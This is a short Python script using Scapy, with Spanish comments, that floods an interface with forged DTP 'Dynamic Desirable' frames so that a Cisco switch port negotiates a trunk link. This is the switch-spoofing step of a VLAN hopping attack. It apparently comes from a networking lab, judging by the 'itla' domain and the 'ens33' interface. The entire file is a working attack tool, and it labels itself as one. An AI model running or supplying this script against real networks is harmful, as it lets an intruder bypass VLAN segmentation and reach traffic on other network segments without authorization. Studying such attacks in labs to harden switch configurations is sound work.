#!/usr/bin/env python3
from scapy.all import *

# Cargar módulo DTP
load_contrib("dtp")

iface = "ens33"

def vlan_hopping():
    print(f"[*] Enviando paquete DTP 'Dynamic Desirable' en {iface}...")
    
    # Creamos un paquete DTP que solicita activamente convertirse en Trunk
    # La MAC de destino es la de multicast para DTP
    pkt = Dot3(src=get_if_hwaddr(iface), dst="01:00:0c:cc:cc:cc") / \
          LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
          SNAP(OUI=0x00000c, code=0x2004) / \
          DTP(tlvlist=[
              DTPDomain(domain='itla'),
              DTPStatus(status='\x03'), # 0x03 es "Dynamic Desirable"
              DTPType(dtptype='\x81\x00')
          ])
    
    sendp(pkt, iface=iface, inter=1, loop=1, verbose=True)

if __name__ == "__main__":
    try:
        vlan_hopping()
    except KeyboardInterrupt:
        print("\n[*] Ataque detenido.")
